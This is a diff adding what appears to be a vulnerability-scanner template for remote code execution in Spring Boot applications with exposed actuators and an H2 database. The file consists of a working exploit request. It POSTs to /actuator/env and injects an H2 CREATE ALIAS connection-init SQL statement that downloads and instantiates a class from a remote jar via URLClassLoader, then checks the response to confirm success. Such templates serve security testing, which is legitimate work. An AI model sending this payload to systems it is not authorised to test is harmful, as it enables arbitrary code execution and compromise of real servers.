@@ -1,0 +1,40 @@
+id: springboot-h2-db-rce
+info:
+  author: dwisiswant0
+  name: Spring Boot H2 Database RCE
+  reference: '- https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database
+
+    - https://twitter.com/pyn3rd/status/1305151887964946432
+
+    - https://www.veracode.com/blog/research/exploiting-spring-boot-actuators
+
+    - https://github.com/spaceraccoon/spring-boot-actuator-h2-rce
+
+    '
+  severity: critical
+  tags: springboot,rce
+requests:
+- body: "{\n  \"name\": \"spring.datasource.hikari.connection-init-sql\",\n  \"value\"\
+    :\"CREATE ALIAS remoteUrl AS $$ import java.net.*;@CODE String remoteUrl() throws\
+    \ Exception { Class.forName(\\\"pop\\\", true, new URLClassLoader(new URL[]{new\
+    \ URL(\\\"http://127.0.0.1:9001/pop.jar\\\")})).newInstance();return null;}$$;\
+    \ CALL remoteUrl()\"\n}\n"
+  headers:
+    Content-Type: application/json
+  matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - '"spring.datasource.hikari.connection-init-sql":"'
+  - part: header
+    type: word
+    words:
+    - application/vnd.spring-boot.actuator
+  matchers-condition: and
+  method: POST
+  path:
+  - '{{BaseURL}}/actuator/env'
